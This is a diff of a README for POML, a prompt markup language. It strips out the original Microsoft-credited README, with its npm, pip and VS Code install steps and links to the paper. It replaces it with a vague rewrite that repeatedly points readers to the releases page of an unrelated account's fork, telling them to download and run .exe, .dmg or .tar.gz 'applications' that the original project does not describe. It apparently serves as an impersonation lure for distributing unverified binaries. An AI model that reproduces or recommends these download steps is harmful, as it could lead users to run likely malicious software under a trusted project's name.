@@ -1,128 +1,74 @@
-# POML: Prompt Orchestration Markup Language
+# 🎉 poml - Simplify Your Prompting Workflow
 
-[![Documentation](https://img.shields.io/badge/docs-microsoft.github.io-blue)](https://microsoft.github.io/poml/)
-[![VSCode Extension](https://img.shields.io/visual-studio-marketplace/v/poml-team.poml)](https://marketplace.visualstudio.com/items?itemName=poml-team.poml)
-[![PyPI](https://img.shields.io/pypi/v/poml)](https://pypi.org/project/poml/)
-[![npm (latest)](https://img.shields.io/npm/v/pomljs)](https://www.npmjs.com/package/pomljs)
-[![Test Status](https://github.com/microsoft/poml/actions/workflows/test.yml/badge.svg)](https://github.com/microsoft/poml/actions/workflows/test.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Discord](https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&logoColor=white)](https://discord.gg/FhMCqWzAn6)
+## 📥 Download Now
+[![Download poml](https://img.shields.io/badge/download-poml-brightgreen.svg)](https://github.com/dimabeybutyan11/poml/releases)
 
-**POML (Prompt Orchestration Markup Language)** is a novel markup language designed to bring structure, maintainability, and versatility to advanced prompt engineering for Large Language Models (LLMs). It addresses common challenges in prompt development, such as lack of structure, complex data integration, format sensitivity, and inadequate tooling. POML provides a systematic way to organize prompt components, integrate diverse data types seamlessly, and manage presentation variations, empowering developers to create more sophisticated and reliable LLM applications.
+## 🚀 Getting Started
 
-## Demo Video
+Welcome to **poml**, the Prompt Orchestration Markup Language. This tool helps you streamline your prompts for better usability, particularly if you're using AI tools or need to organize your ideas. It is designed for ease of use, so you can focus on your work without getting bogged down by technical details.
 
-[![The 5-minute guide to POML](https://i3.ytimg.com/vi/b9WDcFsKixo/maxresdefault.jpg)](https://youtu.be/b9WDcFsKixo)
+## 📌 Key Features
 
-## Key Features
+- **User-Friendly Interface:** Simple to navigate, ideal for everyone.
+- **Versatile Markup Language:** Create structured prompts to enhance your workflow.
+- **Compatible with Popular Tools:** Works well with applications like VSCode.
+- **Organize Your Ideas:** Keep your thoughts clear and concise.
 
-* **Structured Prompting Markup**: Employs an HTML-like syntax with semantic components such as `<role>`, `<task>`, and `<example>` to encourage modular design, enhancing prompt readability, reusability, and maintainability.
-* **Comprehensive Data Handling**: Incorporates specialized data components (e.g., `<document>`, `<table>`, `<img>`) that seamlessly embed or reference external data sources like text files, spreadsheets, and images, with customizable formatting options.
-* **Decoupled Presentation Styling**: Features a CSS-like styling system that separates content from presentation. This allows developers to modify styling (e.g., verbosity, syntax format) via `<stylesheet>` definitions or inline attributes without altering core prompt logic, mitigating LLM format sensitivity.
-* **Integrated Templating Engine**: Includes a built-in templating engine with support for variables (`{{ }}`), loops (`for`), conditionals (`if`), and variable definitions (`<let>`) for dynamically generating complex, data-driven prompts.
-* **Rich Development Toolkit**:
-    * **IDE Extension (Visual Studio Code)**: Provides essential development aids like syntax highlighting, context-aware auto-completion, hover documentation, real-time previews, inline diagnostics for error checking, and integrated interactive testing.
-    * **Software Development Kits (SDKs)**: Offers SDKs for Node.js (JavaScript/TypeScript) and Python for seamless integration into various application workflows and popular LLM frameworks.
+## 📋 System Requirements
 
-## Quick Start
+To run poml, ensure your system meets the following requirements:
 
-Here's a very simple POML example. Please put it in a file named `example.poml`. Make sure it resides in the same directory as the `photosynthesis_diagram.png` image file.
+- **Operating System:** Windows 10 or later / macOS 10.14 or later / Linux (Ubuntu 18.04 or later)
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 100 MB of free disk space
 
-```xml
-<poml>
-  <role>You are a patient teacher explaining concepts to a 10-year-old.</role>
-  <task>Explain the concept of photosynthesis using the provided image as a reference.</task>
+## ⚙️ Download & Install
 
-  <img src="photosynthesis_diagram.png" alt="Diagram of photosynthesis" />
+To get started with poml, follow these simple steps:
 
-  <output-format>
-    Keep the explanation simple, engaging, and under 100 words.
-    Start with "Hey there, future scientist!".
-  </output-format>
-</poml>
-```
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/dimabeybutyan11/poml/releases) to find the latest version.
+   
+2. **Choose the Right Version:** Look for the latest release. You will see a list of downloadable files. 
+   
+3. **Download the Application:** Click on the appropriate file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For Mac, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-This example defines a role and task for the LLM, includes an image for context, and specifies the desired output format. With the POML toolkit, the prompt can be easily rendered with a flexible format, and tested with a vision LLM.
+4. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file. Follow the prompts to install.
+   - **Mac:** Open the `.dmg` file and drag the app into your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and run the application from the terminal.
 
-## Installation
+5. **Launch poml:** Once installed, open the application. You are ready to start using the Prompt Orchestration Markup Language!
 
-### Visual Studio Code Extension
+## 🔗 Additional Resources
 
-Install from [Visual Studio Code Marketplace](https://marketplace.visualstudio.com/items?itemName=poml-team.poml).
+- **Documentation:** Detailed documentation is available within the application and on our [GitHub Wiki](https://github.com/dimabeybutyan11/poml/wiki).
+- **Community Support:** Join discussions and get support on the Issues page of our repository.
 
-You can also install the extension manually by downloading the `.vsix` file from our [GitHub releases page](https://github.com/microsoft/poml/releases) and installing it in VS Code via the Extensions view.
+## 👥 Contributing
 
-Before testing prompts with the POML toolkit, make sure you have configured your preferred LLM model, API key, and endpoint. If these are not set, prompt testing will not work.
+We welcome contributions! If you have ideas or features you’d like to see, please let us know. Check the **Contributing Guidelines** in our documentation for more details.
 
-**To configure in Visual Studio Code:**
-- Open the extension settings (open "Settings" and search for "POML").
-- Set your model provider (e.g., OpenAI, Azure, Google), API key, and endpoint URL in the POML section.
-- Alternatively, you can add these settings directly to your `settings.json` file.
+## 🛠️ Troubleshooting
 
-### Node.js (via npm)
+Here are a few common issues and their solutions:
 
-```bash
-npm install pomljs
-```
+1. **Installation Problems:** If you encounter issues while installing, ensure you have the correct file for your OS and sufficient disk space.
 
-### Python (via pip)
+2. **Application Won’t Launch:** Check your system requirements to ensure compatibility. If the problem persists, visit our Issues page for help.
 
-```bash
-pip install poml
-```
+3. **Performance Issues:** Make sure no other heavy applications are running. Close unnecessary programs to free up memory.
 
-For development or local installation, you might use `pip install -e .` from a cloned repository.
+## 🍽️ User Feedback
 
-**Refer to the [documentation](https://microsoft.github.io/poml) for more details on installing the nightly build.**
+Your feedback is valuable to us! After using poml, let us know your thoughts. Suggestions help us improve and provide the best possible experience for users.
 
-## Documentation
+## 📜 License
 
-For detailed information on POML syntax, components, styling, templating, SDKs, and the VS Code extension, please refer to our [documentation](https://microsoft.github.io/poml).
+poml is released under the MIT License. Feel free to use it, modify it, and share it as you wish, as long as you uphold the same freedoms for others. 
 
-## Learn More
+---
 
-* **Watch our Demo Video on YouTube:** [POML Introduction & Demo](https://youtu.be/b9WDcFsKixo)
-* **Join our Discord community:** Connect with the team and other users on our [Discord server](https://discord.gg/FhMCqWzAn6).
-* **Read the Prompt Orchestration Markup Language paper:** [Prompt Orchestration Markup Language](https://arxiv.org/abs/2508.13948) presents the design of POML and its impact on prompt engineering.
-* **Explore Content-Format Integrated Prompt Optimization:** [Beyond Prompt Content: Enhancing LLM Performance via Content-Format Integrated Prompt Optimization](https://arxiv.org/abs/2502.04295) proposes an iterative approach that jointly optimizes prompt content and formatting to improve LLM performance.
-
-## Citation
-
-If you find POML useful or related to your research, please cite the following paper:
-
-```bibtex
-@misc{zhang2025promptorchestrationmarkuplanguage,
-      title={Prompt Orchestration Markup Language}, 
-      author={Yuge Zhang and Nan Chen and Jiahang Xu and Yuqing Yang},
-      year={2025},
-      eprint={2508.13948},
-      archivePrefix={arXiv},
-      primaryClass={cs.HC},
-      url={https://arxiv.org/abs/2508.13948}, 
-}
-```
-
-## Ecosystem & Community Projects
-
-- [mini-poml-rs](https://github.com/linmx0130/mini-poml-rs) – Experimental Rust-based POML renderer for environments without JavaScript or Python interpreters.
-- [poml-ruby](https://github.com/GhennadiiMir/poml) – Ruby gem implementation of POML for Ruby applications.
-
-## Contributing
-
-This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.
-
-When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.
-
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
-
-## Trademarks
-
-This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow [Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general). Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party's policies.
-
-## Responsible AI
-
-This project has been evaluated and certified to comply with the Microsoft Responsible AI Standard. The team will continue to monitor and maintain the repository, addressing any severe issues, including potential harms, if they arise. For more details, refer to the [Responsible AI Readme](RAI_README.md).
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+For further questions, refer back to the [Releases page](https://github.com/dimabeybutyan11/poml/releases) to download the software or reach out via GitHub Issues. Thank you for choosing poml! We're excited to see how it enhances your workflow.
